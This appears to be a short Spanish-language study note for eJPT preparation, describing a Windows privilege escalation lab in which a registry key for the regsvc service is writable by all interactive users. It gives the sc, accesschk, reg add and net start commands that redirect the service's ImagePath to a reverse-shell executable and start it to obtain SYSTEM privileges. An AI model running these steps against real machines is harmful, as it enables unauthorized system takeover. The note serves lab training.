- Consulta el "regsvc" servicio y noque se ejecuta con privilegios SYSTEM (SERVICE_START_NAME).

```
sc qc regsvc
```

- Usando accesschk.exe, tenga en cuenta que la entrada del registro para el servicio regsvc es escribible por la "NT Grupo AUTHORITY\INTERACTIVE" (esencialmente todos los usuarios registrados):

```
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

- Sobrescribe la clave del registro ImagePath para apuntar al ejecutable reverse.exe que creaste:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

- Inicie un oyente en Kali y luego inicie el servicio para generar un shell inverso que se ejecute con privilegios SYSTEM:

```
net start regsvc
```

enlace:
[[Preparacion-Ejpt]]
[[Herramientas]]
[[Service Exploits - Insecure Service Permissions]]
[[Service Exploits - Insecure Service Executables]]
[[Service Exploits - Unquoted Service Path]]
[[Generate a Reverse Shell Executable]]